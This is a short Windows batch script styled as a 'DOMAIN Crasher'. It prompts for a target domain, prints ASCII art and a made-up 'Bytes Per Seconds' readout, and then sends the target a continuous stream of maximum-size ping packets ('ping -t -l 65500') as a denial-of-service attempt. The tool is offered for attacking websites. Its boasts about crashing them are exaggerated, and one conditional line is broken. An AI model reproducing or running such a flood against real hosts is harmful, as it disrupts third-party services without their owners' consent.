@echo off
Title Prism : DOMAIN Crasher
color 07
echo Enter the Domain you would like to crash
set input=
set /p input= Enter your Domain here:
if %input%==goto A if NOT B
echo Processing Your request
ping localhost>nul
echo To end Crashing press CTRL + C
ping localhost>nul
cls
echo ----------------------------------------------------------------------
echo Now Crashing Website - PRESS CRTL + C TO END - B,s = Bytes Per Seconds
echo ----------------------------------------------------------------------
echo ....................#................
echo ...................###...............
echo ..................#####..............
call \BLAZE3\SYSTEM32\MODULES\ColorEcho.bat 0f ".................#######" && call \BLAZE3\SYSTEM32\MODULES\ColorEcho cC "##########################" && echo(
call \BLAZE3\SYSTEM32\MODULES\ColorEcho.bat f8 "LOCAL ##########" && call \BLAZE3\SYSTEM32\MODULES\ColorEcho 0f "#########"&& call \BLAZE3\SYSTEM32\MODULES\ColorEcho aa "####" && call \BLAZE3\SYSTEM32\MODULES\ColorEcho 0a "65,500B,s" && call \BLAZE3\SYSTEM32\MODULES\ColorEcho aa "#############" && echo  --^> %input%
call \BLAZE3\SYSTEM32\MODULES\ColorEcho.bat 0f "...............###########" && call \BLAZE3\SYSTEM32\MODULES\ColorEcho 11 "########################" && echo(
echo ..............##############..........
echo .............################.........
echo ............##################........
ping %input% -t -l 65500 >NUL


